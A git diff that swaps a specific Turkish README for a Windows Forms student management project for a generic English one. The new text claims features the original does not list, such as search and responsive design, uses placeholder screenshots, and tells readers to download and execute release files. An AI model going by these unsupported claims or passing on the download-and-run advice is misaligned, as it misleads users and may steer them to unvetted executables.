@@ -1,115 +1,106 @@
-# Gelişmiş Programlama - Öğrenci Bilgi Sistemi
+# Advanced Programming Student Management System 🎓
 
-Bu proje, Advanced Programming dersi kapsamında geliştirilmiş bir Windows Forms uygulamasıdır. Uygulama, öğrenci bilgilerini yönetmek için tasarlanmış bir bilgi sistemidir.
+![C#](https://img.shields.io/badge/C%23-239120?style=flat&logo=csharp&logoColor=white) ![SQL Server](https://img.shields.io/badge/SQL%20Server-CC2927?style=flat&logo=microsoftsqlserver&logoColor=white) ![Windows Forms](https://img.shields.io/badge/Windows%20Forms-0078D7?style=flat&logo=windows&logoColor=white) ![.NET](https://img.shields.io/badge/.NET-512BD4?style=flat&logo=dotnet&logoColor=white)
 
-## 📋 Proje Yapısı
+Welcome to the **Advanced Programming Student Management System** repository! This project showcases a comprehensive student information management system built using C# Windows Forms and SQL Server. It includes both midterm and final versions, demonstrating database integration and CRUD (Create, Read, Update, Delete) operations.
 
-- **Adv.Programming - MIDTERM/**: Vize projesi
-- **Adv.Programming - FINAL/**: Final projesi (vize projesinin geliştirilmiş versiyonu)
+## Table of Contents
 
-## 🚀 Özellikler
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Screenshots](#screenshots)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-### Vize Projesi Özellikleri:
-- Öğrenci bilgileri girişi (Ad, Soyad, TC, İl, İlçe, Cinsiyet)
-- Hobi seçenekleri (Müzik, Kitap, Sinema)
-- Öğrenci ikonu seçimi
-- ListView ile öğrenci listesi görüntüleme
-- Farklı görünüm modları (Büyük İkon, Detay, Döşeme, Küçük İkon, Liste)
-- Menü ve toolbar kontrolü
+## Features
 
-### Final Projesi Ek Özellikleri:
-- **Veritabanı entegrasyonu** (SQL Server)
-- Öğrenci bilgilerini veritabanına kaydetme
-- Öğrenci bilgilerini güncelleme
-- Öğrenci kaydı silme
-- Veritabanından öğrenci listesi çekme
-- TC Kimlik numarası doğrulaması
-- Duplicate kayıt kontrolü
+- **User-Friendly Interface**: The application offers a clean and intuitive interface for managing student data.
+- **CRUD Operations**: Easily create, read, update, and delete student records.
+- **Database Integration**: The system connects to a SQL Server database for data storage and retrieval.
+- **Data Validation**: Ensures that all inputs are validated to maintain data integrity.
+- **Search Functionality**: Quickly find student records using search filters.
+- **Responsive Design**: The application is designed to work well on various screen sizes.
 
-## 🛠️ Teknolojiler
+## Technologies Used
 
-- **Platform**: .NET Framework
-- **UI Framework**: Windows Forms
-- **Veritabanı**: SQL Server (LocalDB)
-- **Programlama Dili**: C#
+- **C#**: The primary programming language for developing the application.
+- **Windows Forms**: The framework used to create the graphical user interface.
+- **SQL Server**: The database management system for data storage.
+- **Visual Studio**: The integrated development environment (IDE) used for coding and debugging.
+- **.NET Framework**: Provides the necessary libraries and runtime for the application.
 
-## 📦 Gereksinimler
+## Installation
 
-- Visual Studio 2019 veya üzeri
-- .NET Framework 4.7.2 veya üzeri
-- SQL Server Express LocalDB (Final projesi için)
+To set up the project locally, follow these steps:
 
-## 🔧 Kurulum ve Çalıştırma
+1. **Clone the Repository**: Open your terminal and run the following command:
 
-### Vize Projesi:
-1. `Adv.Programming - MIDTERM/Adv.Programming.sln` dosyasını Visual Studio ile açın
-2. Projeyi derleyin ve çalıştırın
+   ```
+   git clone https://github.com/TonderaiMangwiro/Advanced-Programming-Student-Management-System.git
+   ```
 
-### Final Projesi:
-1. `Adv.Programming - FINAL/Adv.Programming.sln` dosyasını Visual Studio ile açın
-2. SQL Server Express LocalDB'nin kurulu olduğundan emin olun
-3. `database_setup.sql` dosyasını çalıştırarak veritabanını oluşturun
-4. Projeyi derleyin ve çalıştırın
+2. **Open the Project**: Launch Visual Studio and open the cloned project.
 
-## 🗄️ Veritabanı Kurulumu (Final Projesi)
+3. **Set Up SQL Server**: Ensure you have SQL Server installed. Create a database and configure the connection string in the `app.config` file.
 
-Final projesi için veritabanı kurulumu:
+4. **Build the Project**: Build the solution in Visual Studio to restore all dependencies.
 
-```sql
--- database_setup.sql dosyasını SQL Server Management Studio'da çalıştırın
--- Veya uygulama ilk çalıştırıldığında otomatik olarak veritabanı oluşturulacaktır
-```
+5. **Run the Application**: Start debugging to run the application.
 
-Veritabanı bağlantı stringi:
-```csharp
-Data Source=.\SQLEXPRESS;Initial Catalog=VT_OGRENCILER;Integrated Security=True
-```
+## Usage
 
-## 📊 Veritabanı Şeması
+Once the application is running, you can perform the following actions:
 
-```sql
-CREATE TABLE ogrenci (
-    tc NVARCHAR(11) PRIMARY KEY,
-    adi NVARCHAR(50) NOT NULL,
-    soyadi NVARCHAR(50) NOT NULL,
-    ili NVARCHAR(50) NOT NULL,
-    ilcesi NVARCHAR(50) NOT NULL,
-    cinsiyet NVARCHAR(10) NOT NULL,
-    ikon INT NOT NULL,
-    muzik BIT NOT NULL,
-    kitap BIT NOT NULL,
-    sinema BIT NOT NULL
-);
-```
+- **Add Student**: Click on the "Add Student" button to input new student details.
+- **View Students**: Navigate to the "View Students" section to see a list of all registered students.
+- **Edit Student**: Select a student record and click "Edit" to modify their details.
+- **Delete Student**: Choose a student and click "Delete" to remove them from the database.
+- **Search Students**: Use the search bar to quickly find specific student records.
 
-## 🎯 Kullanım
+## Screenshots
 
-1. **Öğrenci Ekleme**: Form alanlarını doldurun ve "Ekle" butonuna tıklayın
-2. **Öğrenci Güncelleme**: Listeden bir öğrenci seçin, bilgileri düzenleyin ve "Güncelle" butonuna tıklayın
-3. **Öğrenci Silme**: Listeden bir öğrenci seçin ve "Sil" butonuna tıklayın
-4. **Listeleme**: "Listele" butonu ile tüm öğrencileri görüntüleyebilirsiniz
+![Main Interface](https://via.placeholder.com/800x400.png?text=Main+Interface)  
+*Main Interface of the Student Management System*
 
-## 📝 Notlar
+![Add Student](https://via.placeholder.com/800x400.png?text=Add+Student)  
+*Add Student Form*
 
-- Öğrenci TC kimlik numaraları 11 haneli olmalıdır
-- Her TC kimlik numarası benzersiz olmalıdır
-- Final projesinde tüm veriler SQL Server veritabanında saklanır
-- Vize projesinde veriler sadece uygulama çalışırken bellekte tutulur
+![View Students](https://via.placeholder.com/800x400.png?text=View+Students)  
+*View Students List*
 
-## 🔒 Güvenlik
+## Contributing
 
-- Veritabanı bağlantısında Windows Authentication kullanılmaktadır
-- Hassas bilgiler kod içerisinde saklanmamaktadır
-- TC kimlik numarası doğrulaması yapılmaktadır
+Contributions are welcome! If you would like to contribute to this project, please follow these steps:
 
-## 📸 Ekran Görüntüleri
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
+2. **Create a Branch**: Create a new branch for your feature or bug fix.
+   ```
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Changes**: Implement your changes in the codebase.
+4. **Commit Your Changes**: Commit your changes with a descriptive message.
+   ```
+   git commit -m "Add some feature"
+   ```
+5. **Push to Your Branch**: Push your changes to your forked repository.
+   ```
+   git push origin feature/YourFeatureName
+   ```
+6. **Open a Pull Request**: Go to the original repository and open a pull request.
 
-Uygulama arayüzü ve özellikler hakkında detaylı bilgi için proje klasörlerindeki executable dosyaları çalıştırabilirsiniz.
+## License
 
-## 👨‍💻 Geliştirici
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-Bu proje, Advanced Programming dersi kapsamında akademik amaçlarla geliştirilmiştir.
+## Releases
 
-## 📄 Lisans
+You can find the latest releases of this project [here](https://github.com/TonderaiMangwiro/Advanced-Programming-Student-Management-System/releases). Download the necessary files and execute them to run the application.
 
-Bu proje eğitim amaçlı olarak geliştirilmiştir ve akademik kullanım için hazırlanmıştır. 
+For more details on previous versions and updates, please check the "Releases" section in the repository.
+
+---
+
+Thank you for your interest in the **Advanced Programming Student Management System**! We hope this project serves as a valuable resource for your academic and programming endeavors.
